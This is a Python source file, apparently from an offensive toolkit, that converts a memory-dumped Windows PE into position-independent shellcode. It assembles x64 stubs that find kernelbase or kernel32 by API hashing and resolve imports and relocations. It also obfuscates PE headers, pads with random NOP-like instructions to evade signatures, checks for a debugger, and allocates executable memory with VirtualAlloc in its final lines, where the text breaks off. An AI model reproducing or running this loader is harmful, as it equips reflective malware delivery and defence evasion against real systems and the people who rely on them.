####
# Original Author: Winslow
# humble editor: Thomas M
### TODO: 
# Ship two modes behind a flag (default to ntdll):

# --api=kernel32 for compatibility and smallest delta.

# --api=ntdll for lower wrapper-level visibility and earlier viability.




import ctypes, struct
from keystone import *
import argparse
import random





def print_banner():
    banner=r"""

                                                                                                                       
  __    _  _    __   __ __   ___   __  _   _____   ___   __      _      __     __    __    ___   ___  
 /  \  | || |  / _] |  V  | | __| |  \| | |_   _| | __| | _\    | |    /__\   /  \  | _\  | __| | _ \ 
| /\ | | \/ | | [/\ | \_/ | | _|  | | ' |   | |   | _|  | v |   | |_  | \/ | | /\ | | v | | _|  | v / 
|_||_|  \__/   \__/ |_| |_| |___| |_|\__|   |_|   |___| |__/    |___|  \__/  |_||_| |__/  |___| |_|_\ 
                      
    
            ╔═══════════════════════════╗
            ║       AUGMENTED LOADER    ║
            ╚═══════════════════════════╝    
Augmented loader position independent code converter       
"""
    print(banner)
    print("Original Author: Winslow")
    print("Editor: TXM ")
    print("signature_redacted")



def generate_asm_by_cmdline(new_cmd):
    new_cmd_length = len(new_cmd) * 2 + 12
    unicode_cmd = [ord(c) for c in new_cmd]


    fixed_instructions = [
        "mov rsi, [rax + 0x20];			# RSI = Address of ProcessParameter",
        "add rsi, 0x70; 			# RSI points to CommandLine member",
        f"mov byte ptr [rsi], {new_cmd_length}; # Set Length to the length of new commandline",
        "mov byte ptr [rsi+2], 0xff; # Set the max length of cmdline to 0xff bytes",
        "mov rsi, [rsi+8]; # RSI points to the string",
        "mov dword ptr [rsi], 0x002e0031; 	# Push '.1'",
        "mov dword ptr [rsi+0x4], 0x00780065; 	# Push 'xe'",
        "mov dword ptr [rsi+0x8], 0x00200065; 	# Push ' e'"
    ]

    start_offset = 0xC
    dynamic_instructions = []
    for i, char in enumerate(unicode_cmd):
        hex_char = format(char, '04x')
        offset = start_offset + (i * 2) 
        if i % 2 == 0:
            dword = hex_char
        else:
            dword = hex_char + dword 
            instruction = f"mov dword ptr [rsi+0x{offset-2:x}], 0x{dword};"
            dynamic_instructions.append(instruction)
    if len(unicode_cmd) % 2 != 0:
        instruction = f"mov word ptr [rsi+0x{offset:x}], 0x{dword};"
        dynamic_instructions.append(instruction)
    final_offset = start_offset + len(unicode_cmd) * 2
    dynamic_instructions.append(f"mov byte ptr [rsi+0x{final_offset:x}], 0;")
    instructions = fixed_instructions + dynamic_instructions
    return "\n".join(instructions)


def read_dump_file(file_path):
    with open(file_path, 'rb') as file:
        return bytearray(file.read())

def print_shellcode(sc):
    for i in range(min(20, len(sc))):
        line = sc[i * 20:(i + 1) * 20]
        formatted_line = ''.join([f"\\x{b:02x}" for b in line])
        print(f"buf += b\"{formatted_line}\"")
    print("......"+str(len(sc)-400) +" more bytes......")



def generate_nop_sequence(desired_length):
    print("[+] Generating NOP-like instructions to pad magic code stub up to 0x1000 bytes")
    nop_like_instructions = [
        {"instruction": [0x90], "length": 1},  # NOP
        {"instruction": [0x86, 0xdb], "length": 2},  # xchg bl, bl;
        {"instruction": [0x66, 0x87, 0xf6], "length": 3},  # xchg si, si;
        {"instruction": [0x48, 0x93, 0x48, 0x93], "length": 4},  # xchg rax, rbx; xchg rbx, rax;
        {"instruction": [0x66, 0x83, 0xc2, 0x00], "length": 4},  # add dx, 0
        {"instruction": [0x48, 0xff, 0xc0, 0x48, 0xff, 0xc8], "length": 6},  # inc rax; dec rax;
        {"instruction": [0x49, 0xf7, 0xd8, 0x49, 0xf7, 0xd8], "length": 6},  # neg r8; neg r8;
        {"instruction": [0x48, 0x83, 0xc0, 0x01, 0x48, 0xff, 0xc8], "length": 7},  # add rax,0x1; dec rax;
        {"instruction": [0x48, 0x83, 0xe9, 0x02, 0x48, 0xff, 0xc1, 0x48, 0xff, 0xc1], "length": 10},  # sub rcx, 2; inc rcx; inc rcx
        # sub rcx, 3; add rcx, 1; inc rcx; inc rcx: 
        {"instruction": [0x48, 0x83, 0xE9, 0x01, 0x48, 0xFF, 0xC9, 0x48, 0xFF, 0xC1, 0x48, 0xFF, 0xC1], "length": 13},  
    ]

    sequence = bytearray()
    current_length = 0

    while current_length < desired_length:
        available_instructions = [instr for instr in nop_like_instructions if current_length + instr["length"] <= desired_length]
        if not available_instructions:
            sequence.extend([0x90] * (desired_length - current_length))
            break
        
        selected_instruction = random.choice(available_instructions)
        sequence.extend(selected_instruction["instruction"])
        current_length += selected_instruction["length"]

    #sequence_hex = ' '.join(format(byte, '02x') for byte in sequence)
    return sequence


### detection signature: 
def obfuscate_header(pe_header_array, segments):
    obfuscated_header = bytearray(random.getrandbits(8) for _ in range(len(pe_header_array))) 

    signature = b"BOAZ.TXM"  # 8 bytes
    obfuscated_header[:len(signature)] = signature
    
    # Iterate through each segment and restore the original bytes in those segments
    for segment in segments:
        offset, length = next(iter(segment.items()))
        obfuscated_header[offset:offset + length] = pe_header_array[offset:offset + length]

    return obfuscated_header


def modify_pe_signatures(segments):
    print("[+] Dynamically generated instructions to obfuscate non-essential PE signatures:")
    instructions = []
    for segment in segments:
        offset, size = next(iter(segment.items()))
  #  for segment, size in segments.items():
        if size == 2:  # For WORD
            random_value = random.getrandbits(16)
            instruction = f"    mov word ptr [rbx+{offset:#x}], {random_value:#04x};"
        elif size == 4:  # For DWORD
            random_value = random.getrandbits(32)
            instruction = f"    mov dword ptr [rbx+{offset:#x}], {random_value:#08x};"
        elif size == 8:  # For QWORD
            random_value1 = random.getrandbits(32)
            random_value2 = random.getrandbits(32)
            instruction = f"    mov dword ptr [rbx+{offset:#x}], {random_value1:#08x};\n    mov dword ptr [rbx+{offset+4:#x}], {random_value2:#08x};"
        else:
            raise ValueError("[-] Unsupported size for segment.")
        instructions.append(instruction)
    return "\n".join(instructions)




if __name__ == "__main__":
    print_banner()
    parser = argparse.ArgumentParser(description='Generate shellcode stub to append to the dumped PE file.')
    parser.add_argument('--file', '-f', required=True, dest='input_file',help='The input binary file dumped by DumpPEFromMemory.exe')
    parser.add_argument('--cmdline', '-c', required=False, default="", dest='cmdline',help='Supplied command line')
    parser.add_argument('--bin', '-b', required=True, dest='bin',help='Save the PIC code as a bin file')
    parser.add_argument('--obfuscate', '-o', required=False, default="false", dest='obfus',help='Save the PIC code as a bin file')
    parser.add_argument('--execution', '-e', required=False, default='False', dest='sc_exec',help='(Only Windows) Immediately execute shellcoded PE? True/False')

    args = parser.parse_args()
    input_file= args.input_file
    cmdline = args.cmdline
    bin = args.bin
    sc_exec = args.sc_exec
    obfus = args.obfus
    pe_array = read_dump_file(input_file)
    update_cmdline_asm = generate_asm_by_cmdline(cmdline)	# Generate shellcode that used to update command line


    CODE = (
"start:"
" and rsp, 0xFFFFFFFFFFFFFFF0;"		# Stack alignment 16
" xor rdx, rdx;"                    # avoid null bytes
" mov rax, gs:[rdx+0x60];"		# RAX = PEB Address
" cmp byte ptr [rax+2], 0;"      # BeingDebugged == 0?
" jz skip_bp;"
" int3;"
" skip_bp:"
# " int3;"                 # Debugging breakpoint


"update_cmdline:"
f"{update_cmdline_asm}"


# "find_kernel32:"
# " mov rsi,[rax+0x18];"			# RSI = Address of _PEB_LDR_DATA <-- Ldr
# # # dt nt!_PEB_LDR_DATA
# # # InInitializationOrderModuleList: 
# # # " mov rsi,[rsi + 0x30];"		# RSI = Address of the InInitializationOrderModuleList
# # # " mov r9, [rsi];"			
# # # " mov r9, [r9];"			
# # # " mov r9, [r9+0x10];"			# kernel32.dll 
# # # InLoadOrderModuleList: 
# " mov rsi,[rsi + 0x10];"		# RSI = Address of the InLoadOrderModuleList member in the _PEB_LDR_DATA structure
# " lodsq;"
# ## hash [rax+0x58] string
# ## compare the hash with the supplied hash of kernelbase.dll, if not equal, continue to the next module
# " xchg rax, rsi;"			
# " lodsq;"
# ## hash [rax+0x58+0x8] string
# ## compare the hash with the supplied hash of kernelbase.dll, if not equal, continue to the next module
# " xchg rax, rsi;"			
# " lodsq;"
# " mov r9, [rax+0x30];"		 # resolve to kernelbase.dll instead of kernel32.dll 
# # " mov r9, [rsi];"			
# # " mov r9, [r9];"			
# # " mov r9, [r9+0x30];"			# kernel32.dll 
# # # InMemoryOrderModuleList: 
# # # " mov rsi,[rsi + 0x20];"   # RSI is the address of the InMemoryOrderModuleList member in the _PEB_LDR_DATA structure
# # # " mov r9, [rsi];"          # Current module is current executable
# # # " mov r9, [r9];"           # Current module is ntdll.dll
# # # dt nt!_LDR_DATA_TABLE_ENTRY
# # # # dq r9+0x20 L1
# # # # db poi(r9+0x20)
# # # # lm m kernel32
# # # " mov r9, [r9+0x20];"      # Current module is kernel32.dll
# " jmp function_stub;"			# Jump to func call stub


### Kernelbase stores the function call stubs instead of kernel32 in latest Winwdows-11
"find_kernelbase_byhash:"                       # Entry. Assumes RAX already holds PEB (you did gs:[rdx+0x60] earlier)
" mov rsi, qword ptr [rax+0x18];"              # RSI = PEB->Ldr (_PEB_LDR_DATA*)
" lea rdi, [rsi+0x10];"                        # RDI = &Ldr->InLoadOrderModuleList (list head)
" mov rbx, qword ptr [rdi];"                   # RBX = head->Flink --> first _LDR_DATA_TABLE_ENTRY (anchor at +0)

"fk_loop:"                                      # Iterate modules (in-load order)
" cmp rbx, rdi;"                                # Reached list head again?
" je fk_not_found;"                             # Yes -> kernelbase.dll not found in first pass
" mov rsi, qword ptr [rbx+0x60];"              # RSI = BaseDllName.Buffer (PWSTR). 0x58 (UNICODE_STRING) + 0x8 (Buffer) = 0x60
" xor edx, edx;"                                # EDX = 0 (hash accumulator)
" cld;"                                         # Clear DF so LOD* auto-increments RSI

"fk_hash:"                                      # Hash BaseDllName (UTF-16LE) using ROL7/XOR on low byte
" lodsw;"                                       # AX = [RSI] (UTF-16LE code unit), RSI += 2
" test al, al;"                                 # NUL terminator reached? (low byte == 0)
" jz fk_hash_done;"                             # Yes -> stop hashing
" or al, 0x20;"                                 # ASCII tolower (A–Z only); harmless for '.' and digits, + 0x20 to upper case letter
" rol edx, 7;"                                  # h = ROL32(h, 7)
" movzx eax, al;"                               # EAX = zero-extended low byte
" xor edx, eax;"                                # h ^= char
" jmp fk_hash;"                                 # Next character

"fk_hash_done:"                                 # Compare against precomputed constant
" cmp edx, 0xe742ea43;"                         # hash('kernelbase.dll')
" je fk_found;"                                  # Match -> we found kernelbase.dll
" mov rbx, qword ptr [rbx];"                   # RBX = Flink -> next entry (still struct base because anchor at +0)
" jmp fk_loop;"                                  # Continue scanning

"fk_found:"                                     
" mov r9, qword ptr [rbx+0x30];"               # R9 = DllBase (module base of kernelbase.dll)
" jmp function_stub;"                           # Continue to your export resolver using R9

"fk_not_found:"                                  # Fallback pass: look for kernel32.dll instead
" mov rbx, qword ptr [rdi];"                   # Restart at first entry

"fk2_loop:"                                    
" cmp rbx, rdi;"                                # End of list?
" je fk2_fail;"                                  # Yes --> not found
" mov rsi, qword ptr [rbx+0x60];"              # RSI = BaseDllName.Buffer (PWSTR)
" xor edx, edx;"                                # Reset hash
" cld;"                                         # Ensure forward scan

"fk2_hash:"                                     # Same ROL7/XOR loop
" lodsw;"
" test al, al;"
" jz fk2_done;"
" or al, 0x20;"
" rol edx, 7;"
" movzx eax, al;"
" xor edx, eax;"
" jmp fk2_hash;"

"fk2_done:"
" cmp edx, 0x4b1ffe8e;"                         # hash('kernel32.dll')
" je fk2_found;"                                  # Found kernel32.dll
" mov rbx, qword ptr [rbx];"                   # Next entry
" jmp fk2_loop;"

"fk2_found:"
" mov r9, qword ptr [rbx+0x30];"               # R9 = DllBase (kernel32.dll)
" jmp function_stub;"                           # Continue

"fk2_fail:"
" xor r9, r9;"                                  # Not found --> R9 = 0 (signal failure downstream)
" jmp function_stub;"                           # Continue anyway; resolver can handle null base



####

"parse_module:"				# Parsing DLL file in memory
" mov ecx, dword ptr [r9 + 0x3c];"	# R9 = Base address of the module, ECX = NT header (IMAGE_NT_HEADERS) offset
" xor r15, r15;"
" mov r15b, 0x88;"			# Offset to Export Directory   base + nt_header+0x88
" add r15, r9;"				
" add r15, rcx;"			# R15 points to Export Directory
" mov r15d, dword ptr [r15];"		# R15 = RVA of export directory
" add r15, r9;"				# R15 = VA of export directory
" mov ecx, dword ptr [r15 + 0x18];"	# ECX = # of function names as an index value
" xor ebx, ebx;"
" mov r14d, dword ptr [r15 + 0x20];"	# R14 = RVA of Export Name Pointer Table (ENPT)
" add r14, r9;"				# R14 = VA of ENPT


"search_function:"			# Search for a given function
" cmp ebx, ecx;"                   # if index >= #names -> not found
" jge not_found;" 
" mov esi, [r14 + rbx*4];"           # RVA of function name
" add rsi, r9;" 



"function_hashing:"			# Hash function name function
" xor rax, rax;"            ## zero AL, used for lodsb target
" xor rdx, rdx;"            ## zero current hash accumulator
" mov edx, 5381;"        # start hash = 5381 for djb2
" cld;"					# Clear DF flag, force RSI to walk forward, std to reverse comparison?

### modify the hash function. 
"iteration:"				# Iterate over each byte
# " lodsb;"				# Copy the next byte of RSI to Al
# " test al, al;"				# If reaching the end of the string, 0x00
# " jz compare_hash;"			# Compare hash
# " ror edx, 0x0d;"			# Part of hash algorithm
# " add edx, eax;"			# Part of hash algorithm
# " jmp iteration;"			# Next byte
## XOR7:
# " lodsb;"
# " test al, al;"
# " jz compare_hash;"
# " rol edx, 7;"
# " xor edx, eax;"
# " jmp iteration;"
### FNV-1a: 
# " mov edx, 0x811C9DC5;"  # FNV offset basis
# " lodsb;"
# " test al, al;"
# " jz compare_hash;"
# " xor edx, eax;"
# " imul edx, edx, 0x01000193;"
# " jmp iteration;"
## djb2
" lodsb;"
" test al, al;"
" jz compare_hash;"
" movzx   eax, al;"         # zero-extend AL to EAX
" imul    edx, edx, 33;"           # hash * 33
" add edx, eax;"         # + current char
" jmp iteration;"


## backward: 
# "compare_hash:"				# Compare hash
# " cmp edx, r8d;"			# R8 = Supplied function hash
# " jnz search_function;"			# If not equal, search the previous function (index decreases)
# " mov r10d, [r15 + 0x24];"		# Ordinal table RVA, 
# " add r10, r9;"				# R10 = Ordinal table VMA
# # " movzx ecx, word ptr [r10 + 2*rcx];"	# Ordinal value -1
# " movzx ecx, word ptr [r10 + rbx*2];"	# Ordinal value -1
# " mov r11d, [r15 + 0x1c];"		# RVA of EAT
# " add r11, r9;"				# r11 = VA of EAT
# " mov eax, [r11 + 4*rcx];"		# RAX = RVA of the function
# " add rax, r9;"				# RAX = VA of the function
# " ret;"
## backward. 

## forward: 
"compare_hash:"				# Compare hash
" cmp edx, r8d;"            # R8 = Supplied function hash
" je found;"                # If equal -> jump to found
" inc ebx;"                 # Otherwise next index
" jmp search_function;"     # Loop

"found:"                    # Found matching hash
" mov r10d, [r15 + 0x24];"  # Ordinal table RVA
" add r10, r9;"             # R10 = Ordinal table VMA
" movzx ecx, word ptr [r10 + rbx*2];"  # Ordinal value -1 (use EBX)
" mov r11d, [r15 + 0x1c];"  # RVA of EAT
" add r11, r9;"             # r11 = VA of EAT
" mov eax, [r11 + 4*rcx];"  # RAX = RVA of the function. r11(base of AddressOfFunctions) + 4*OrdinalAddress
" add rax, r9;"             # RAX = VA of the function
" ret;"
## forward. 

"not_found:"
" xor rax, rax;"			# Return zero
" ret;"

"function_stub:"			
" mov rbp, r9;"				# RBP stores base address of Kernel32.dll
# " mov r8d, 0xec0e4e8e;"			# LoadLibraryA Hash
# " mov r8d, 0xc8ac8026;"           # xor7
" mov r8d, 0x5fbff0fb;"             # djb2
" call parse_module;"			# Search LoadLibraryA's address
" mov r12, rax;"			# R12 stores the address of LoadLibraryA function
# " mov r8d, 0x7c0dfcaa;"			# GetProcAddress Hash
# " mov r8d, 0x1fc0eaee;"           # xor7
" mov r8d, 0xcf31bb1f;"            # djb2   
" call parse_module;"			# Search GetProcAddress's address
" mov r13, rax;"			# R13 stores the address of GetProcAddress function
)


    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    encoding, count = ks.asm(CODE)
    # CODE_LEN = len(encoding) + 25   
    CODE_LEN = len(encoding) + 7
    CODE_OFFSET = 4096 - CODE_LEN 
    e_lfanew, = struct.unpack('<I', pe_array[0x3c:0x3c+4])
    print("[+] The offset to NT header is "+ str(hex(e_lfanew)))

    segments = [{0x3c: 4}, {e_lfanew+0x28: 4}, {e_lfanew+0x30: 8}, {e_lfanew+0x50: 4}, {e_lfanew+0x90: 8}, {e_lfanew+0xb0: 8}, {e_lfanew+0xf0: 8}] # Segments in PE header that need to be intact
# e_lfanew, entry point, preferred address, size of image, export directory, import directory, baserelocation directory, delayed import directory 
    if obfus.lower() == "true": 
        print("[+] Depending on the program, obfuscation may not be compatible with it. ")
        obfuscated_signatures = modify_pe_signatures(segments)
    else:
        obfuscated_signatures = ""
    print(obfuscated_signatures+"\n")


    CODE2 = (
f"lea rbx, [rip+{CODE_OFFSET}];"	
#
" xor rdx, rdx;"                    # avoid null bytes
" mov rax, gs:[rdx+0x60];"		# RAX = PEB Address
" cmp byte ptr [rax+2], 0;"      # BeingDebugged == 0?
" jz skip_bp;"
" int3;"
" skip_bp:"
#
" jmp fix_import_dir;"			# Jump to fix_iat section


"find_nt_header:"			# Quickly return NT header in RAX
# " xor rax, rax;"
# " mov eax, [rbx+0x3c];"   		# EAX contains e_lfanew
# " add rax, rbx;"          		# RAX points to NT Header
# " ret;"					
" mov eax, [rbx+0x3c];"    # e_lfanew is a 4-byte value
" lea rax, [rbx + rax];"   # LEA can do addition without affecting flags
" ret;"

### IMAGE_DATA_DIRECTORY: 
#define IMAGE_DIRECTORY_ENTRY_EXPORT          0   // Export Directory
#define IMAGE_DIRECTORY_ENTRY_IMPORT          1   // Import Directory  <--- 
#define IMAGE_DIRECTORY_ENTRY_RESOURCE        2   // Resource Directory
#define IMAGE_DIRECTORY_ENTRY_EXCEPTION       3   // Exception Directory
#define IMAGE_DIRECTORY_ENTRY_SECURITY        4   // Security Directory
#define IMAGE_DIRECTORY_ENTRY_BASERELOC       5   // Base Relocation Table
#define IMAGE_DIRECTORY_ENTRY_DEBUG           6   // Debug Directory
# //      IMAGE_DIRECTORY_ENTRY_COPYRIGHT       7   // (X86 usage)
#define IMAGE_DIRECTORY_ENTRY_ARCHITECTURE    7   // Architecture Specific Data
#define IMAGE_DIRECTORY_ENTRY_GLOBALPTR       8   // RVA of GP
#define IMAGE_DIRECTORY_ENTRY_TLS             9   // TLS Directory
#define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG    10   // Load Configuration Directory
#define IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT   11   // Bound Import Directory in headers
#define IMAGE_DIRECTORY_ENTRY_IAT            12   // Import Address Table
#define IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT   13   // Delay Load Import Descriptors

"fix_import_dir:"  			# Init necessary variable for fixing IAT
" xor rsi, rsi;"
" xor rdi, rdi;"
" call find_nt_header;"
" mov esi, [rax+0x90];"  		# ESI = ImportDir RVA
" add rsi, rbx;"         		# RSI points to ImportDir
" mov edi, [rax+0x94];"   		# EDI = ImportDir Size
" add rdi, rsi;"          		# RDI = ImportDir VA + Size == size of the Import Directory

# Iterates through each IMAGE_IMPORT_DESCRIPTOR
"loop_module:"
" cmp rsi, rdi;"          		# Compare current descriptor with the end of import directory
" je loop_end;"		    		# If equal, exit the loop
" xor rdx ,rdx;"
" mov edx, [rsi+0x10];"        		# EDX = IAT RVA (32-bit)
" test rdx, rdx;"         		# Check if ILT RVA is zero (end of descriptors)
" je loop_end;"		    		# If zero, exit the loop
" xor rcx, rcx;"
" mov ecx, [rsi+0xc];"    		# RCX = Module Name RVA
" add rcx, rbx;"          		# RCX points to Module Name
" call r12;"              		# Call LoadLibraryA
" xor rdx ,rdx;"			
" mov edx, [rsi+0x10];"        		# Restore IAT RVA
" add rdx, rbx;"          		# RDX points to IAT
" mov rcx, rax;"          		# Module handle for GetProcAddress
" mov r14, rdx;"			# Backup IAT Address


"loop_func:"
" mov rdx, r14;"			# Restore IAT address + processed entries
" mov rdx, [rdx];"        		# RDX = Ordinal or RVA of HintName Table
" test rdx, rdx;"         		# Check if it's the end of the IAT
" je next_module;"	    		# If zero, move to the next descriptor
# " mov r9, 0x8000000000000000;"
# " test rdx, r9;"  			# Check if it is import by ordinal (highest bit set)
# " mov rbp, rcx;"			# Save module base address
# " jnz resolve_by_ordinal;"		# If set, resolve by ordinal
" bt rdx, 63;"             # Check if it is import by ordinal (63 bit set)
" mov rbp, rcx;"			# Save module base address
" jc resolve_by_ordinal;"  # Jump if carry (bit was set), If set, resolve by ordinal



"resolve_by_name:"
" add rdx, rbx;"          		# RDX = HintName Table VA
" add rdx, 2;"		  		# RDX points to Function Name
" call r13;"              		# Call GetProcAddress
" jmp update_iat;"        		# Go to update IAT


"resolve_by_ordinal:"
# " mov r9, 0x7fffffffffffffff;"
# " and rdx, r9;"			   	# RDX = Ordinal number
" btr rdx, 63;"            # Bit test and reset - clears bit 63, sets CF
" call r13;"              		# Call GetProcAddress with ordinal


"update_iat:"
" mov rcx, rbp;"          		# Restore module base address
" mov rdx, r14;"				# Restore IAT Address + processed entries
" mov [rdx], rax;"         		# Write the resolved address to the IAT
" add r14, 0x8;"		  	# Move to the next ILT entry
" jmp loop_func;"			# Repeat for the next function


"next_module:"
" add rsi, 0x14;"         		# Move to next import descriptor
" jmp loop_module;"  			# Continue loop


"loop_end:"



"fix_basereloc_dir:"
" xor rsi, rsi;"
" mov rdi, rsi;"    # rdi = 0
" mov r8, rsi;"     # r8 = 0 R8 to save page RVA
" mov r9, rsi;"     # r9 = 0 R9 to place block size
" mov r15, rsi;"    # r15 = 0

" call find_nt_header;"
" mov esi, [rax+0xb0];"  		# ESI = BaseReloc RVA
" add rsi, rbx;"         		# RSI points to BaseReloc
" mov edi, [rax+0xb4];"   		# EDI = BaseReloc Size
" add rdi, rsi;"          		# RDI = BaseReloc VA + Size
" mov r15d, [rax+0x28];"		# R15 = Entry point RVA
" add r15, rbx;"			# R15 = Entry point
" mov r14, [rax+0x30];"			# R14 = Preferred address
" sub r14, rbx;"			# R14 = Delta address 
" mov [rax+0x30], rbx;"			# Update Image Base Address
" mov r8d, [rsi];"			# R8 = First block page RVA
" add r8, rbx;"				# R8 points to first block page (Should add an offset later)
" mov r9d, [rsi+4];"			# First block's size
" xor rax, rax;"
" xor rcx, rcx;"


"loop_block:"
" cmp rsi, rdi;"          		# Compare current block with the end of BaseReloc
" jge basereloc_fixed_end;"    		# If equal, exit the loop
" xor r8, r8;"
" mov r8d, [rsi];"			# R8 = Current block's page RVA
" call find_nt_header;"			# Reach NT Header
" add rax, 0x50;"			# Reach image size field
" cmp r8d, [rax];"			# Compare page rva and image size
" jg basereloc_fixed_end;"		# Finish base relocation fixing process


" add r8, rbx;"				# R8 points to current block page (Should add an offset later)
" mov r11, r8;"				# Backup R8
" xor r9, r9;"
" mov r9d, [rsi+4];"			# R9 = Current block size
" add rsi, 8;"				# RSI points to the 1st entry, index for inner loop for all entries
" mov rdx, rsi;"
" add rdx, r9;"
" sub rdx, 8;"				# RDX = End of all entries in current block


"loop_entries:"
" cmp rsi, rdx;"			# If we reached the end of current block
" jz next_block;"			# Move to next block
" xor rax, rax;"
" mov ax, [rsi];"			# RAX = Current entry value
" test ax, ax;" 
" jz skip_padding_entry;"		# Reach the end of entry and the last entry is a padding entry
" mov r10, rax;"			# Copy entry value to R10
" and eax, 0xfff;"			# Offset, 12 bits
" add r8, rax;"				# Added an offset
" call find_nt_header;"			# Reach NT Header
" add rax, 0x50;"			# Reach image size field
" sub r8, rbx;"
" cmp r8d, [rax];"			# Compare page rva and image size
" jg basereloc_fixed_end;"		# Finish base relocation fixing process
" add r8, rbx;"


"update_entry:"
" sub [r8], r14;"			# Update the address
" mov r8, r11;"				# Restore r8
" add rsi, 2;"				# Move to next entry by adding 2 bytes
" jmp loop_entries;"


"skip_padding_entry:"			# If the last entry is a padding entry
" add rsi, 2;"				# Directly skip this entry


"next_block:"
" jmp loop_block;"


"basereloc_fixed_end:"


"fix_delayed_import_dir:"
" call find_nt_header;"
" mov esi, [rax+0xf0];"			# ESI = DelayedImportDir RVA
" test esi, esi;"			# If RVA = 0?
" jz delayed_loop_end;"			# Skip delay import table fix
" add rsi, rbx;"			# RSI points to DelayedImportDir


"delayed_loop_module:"
" xor rcx, rcx;"			
" mov ecx, [rsi+4];"			# RCX = Module name string RVA
" test rcx, rcx;"			# If RVA = 0, then all modules are processed
" jz delayed_loop_end;"			# Exit the module loop
" add rcx, rbx;"			# RCX = Module name
" call r12;"				# Call LoadLibraryA
" mov rcx, rax;"			# Module handle for GetProcAddress for 1st arg
" xor r8, r8;"				
" xor rdx, rdx;"
" mov edx, [rsi+0x10];"			# EDX = INT RVA
" add rdx, rbx;"			# RDX points to INT
" mov r8d, [rsi+0xc];"			# R8 = IAT RVA
" add r8, rbx;"				# R8 points to IAT
" mov r14, rdx;"			# Backup INT Address
" mov r15, r8;"				# Backup IAT Address


"delayed_loop_func:"
" mov rdx, r14;"			# Restore INT Address + processed data
" mov r8, r15;"				# Restore IAT Address + processed data
" mov rdx, [rdx];"			# RDX = Name Address RVA
" test rdx, rdx;"			# If Name Address value is 0, then all functions are fixed
" jz delayed_next_module;"		# Process next module
" mov r9, 0x8000000000000000;"
" test rdx, r9;"			# Check if it is import by ordinal (highest bit set of NameAddress)
" mov rbp, rcx;"			# Save module base address
" jnz delayed_resolve_by_ordinal;"	# If set, resolve by ordinal


"delayed_resolve_by_name:"
" add rdx, rbx;"			# RDX points to NameAddress Table
" add rdx, 2;"				# RDX points to Function Name
" call r13;"				# Call GetProcAddress
" jmp delayed_update_iat;"		# Go to update IAT


"delayed_resolve_by_ordinal:"
" mov r9, 0x7fffffffffffffff;"
" and rdx, r9;"				# RDX = Ordinal number
" call r13;"				# Call GetProcAddress with ordinal


"delayed_update_iat:"
" mov rcx, rbp;"			# Restore module base address
" mov r8, r15;"				# Restore current IAT address + processed
" mov [r8], rax;"			# Write the resolved address to the IAT
" add r15, 0x8;"			# Move to the next IAT entry (64-bit addresses)
" add r14, 0x8;"			# Movce to the next INT entry
" jmp delayed_loop_func;"		# Repeat for the next function


"delayed_next_module:"
" add rsi, 0x20;"			# Move to next delayed imported module
" jmp delayed_loop_module;"		# Continue loop


"delayed_loop_end:"


"all_completed:"        
" call find_nt_header;"
" xor r9, r9;"
" mov r9d, dword ptr [rax+0x28];"	# R9 = Entry point RVA
" mov rcx, rbx;"			# RCX = Image Base
f"{obfuscated_signatures}"
" add rbx, r9;"				# RBX = Entry Point    	
" xor rdx, rdx;"
" inc rdx;"
" xor r8, r8;"
" push r13;"				# Save GetProcAddress
" push rcx;"				# Save Image Base
" sub rsp, 0x30;"
" call rbx;"                # call reallocated PE file
" add rsp, 0x30;"
" pop rcx;"				# Recover GetProcAddress
" pop r13;"
" xor rdx, rdx;"
" mov rax, gs:[rdx+0x60];"		# RAX = PEB Address
" mov rcx,[rax+0x18];"			# RCX = Address of _PEB_LDR_DATA
#
# " mov rcx,[rcx + 0x30];"		# RCX = Address of the InInitializationOrderModuleList
# " mov rcx, [rcx];"
# " mov rcx, [rcx];"			
# " mov rcx, [rcx+0x10];"			# kernel32
#
# " mov rcx,[rcx + 0x20];"		# RCX = Address of the InMemoryOrderModuleList
# " mov rcx, [rcx];"              # Current module is current executable
# " mov rcx, [rcx];"			    # ntdll
# " mov rcx, [rcx+0x20];"			# kernel32
#
" mov rcx,[rcx + 0x10];"		# RSI = Address of the InLoadOrderModuleList member in the _PEB_LDR_DATA structure
" mov rcx, [rcx];"			
" mov rcx, [rcx];"			
" mov rcx, [rcx+0x30];"			# kernel32.dll 
#
" xor r15, r15;"	
" push r15;"				# Align 16 bytes
" push r15;"				
# " mov rdx, 0x737365636F725065;"		# Push string "ssecorPe" to RDX
# " push rdx;"
# " mov rdx, 0x74616E696D726554;"		# Push string "tanimreT" to RDX
# " push rdx;"
# " mov rax, 0x737365636F725065746E696D726554;" # Pack both strings
# " push rax;"                                    # Push combined
# " mov rdx, rsp;"                               # Point to string
# #
# " mov rdx, rsp;"
# " sub rsp, 0x30;"
# " call r13;"				# Get TerminateProcess address
# " add rsp, 0x30;"
# " xor rcx, rcx;"
# " dec rcx;"				# HANDLE = -1
# " xor rdx, rdx;"			# uExitCode = 0
# " sub rsp, 0x30;"
# " call rax;"
# " add rsp, 0x30;"
"push 0x00000000000000737365;"   # "ess\0"
"mov rax, 0x636f725074697845;"   # "ExitProc"
"push rax;"
"mov rdx, rsp;"

"sub rsp, 0x30;"
"call r13;"
"add rsp, 0x30;"
"add rsp, 16;"

"xor ecx, ecx;"
"sub rsp, 0x30;"
"call rax;"
)

    ks2 = Ks(KS_ARCH_X86, KS_MODE_64)
    encoding2, count2 = ks.asm(CODE2)
    encoding = encoding + encoding2

    sh = b""
    for e in encoding:
        sh += struct.pack("B", e)
    shellcode = bytearray(sh)

    print("[+] Shellcode Stub size: "+str(len(shellcode))+" bytes")

    nop_segments = generate_nop_sequence(0x1000-len(shellcode))	# Pad the shellcode stub up to 0x1000 bytes

    if obfus.lower() == "true": 
        merged_shellcode = shellcode + nop_segments + obfuscate_header(pe_array[0:0x1000], segments) + pe_array[0x1000:] 
    else:
        merged_shellcode = shellcode + nop_segments + pe_array

    print("[+] shellcode prepended PE size: "+str(len(merged_shellcode))+" bytes\n\n")
    print_shellcode(merged_shellcode)


    try:
        with open(bin, 'wb') as f:
            f.write(merged_shellcode)
            print("\n\n[+] Generated shellcode successfully saved in file "+bin)
    except Exception as e:
        print(e)
	

if sc_exec.lower() == "true": 
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(merged_shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
    buf = (ctypes.c_char * len(merged_shellcode)).from_buffer(merged_shellcode)
